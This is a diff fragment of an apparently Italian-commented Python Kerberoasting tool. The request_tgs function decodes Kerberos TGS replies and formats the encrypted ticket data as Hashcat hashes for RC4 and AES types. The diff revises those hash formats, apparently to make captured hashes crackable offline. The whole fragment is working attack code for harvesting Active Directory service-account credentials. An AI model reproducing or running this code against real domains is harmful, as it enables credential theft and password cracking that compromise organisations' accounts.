@@ -106,7 +106,7 @@ def request_tgs(dc_ip, domain, tgt, cipher, session_key, spn):
             sessionKey=session_key,
         )
 
-        # Decodifica il TGS per estrarre l'hash
+        # Decodifica il TGS per estrarre l'hash (MAJOR BUG WAS HERE)
         tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
         enc_part = tgs_rep['ticket']['enc-part']
         etype = int(enc_part['etype'])
@@ -115,15 +115,15 @@ def request_tgs(dc_ip, domain, tgt, cipher, session_key, spn):
         # Formatta hash per Hashcat
         if etype == 23:
             # RC4-HMAC → Hashcat mode 13100
-            hash_str = f"$krb5tgs$23$*{spn}*${domain_upper}${spn}*${cipher_data[:32]}${cipher_data[32:]}"
+            hash_str = f"$krb5tgs$23$*{spn}*${domain_upper}${spn}*${cipher_data}"
         elif etype == 17:
             # AES128 → Hashcat mode 19600
-            hash_str = f"$krb5tgs$17${domain_upper}${spn}*${cipher_data}"
+            hash_str = f"$krb5tgs$17$*{spn}*${domain_upper}${spn}*${cipher_data}"
         elif etype == 18:
             # AES256 → Hashcat mode 19700
-            hash_str = f"$krb5tgs$18${domain_upper}${spn}*${cipher_data}"
+            hash_str = f"$krb5tgs$18$*{spn}*${domain_upper}${spn}*${cipher_data}"
         else:
-            hash_str = f"$krb5tgs$23$*{spn}$*{domain_upper}${spn}*${cipher_data[:32]}${cipher_data[32:]}"
+            hash_str = f"$krb5tgs${etype}$*{spn}*${domain_upper}${spn}*${cipher_data}"
 
         print(f"  [+] {spn} - TGS hash catturato! (etype {etype})")
         return hash_str, etype
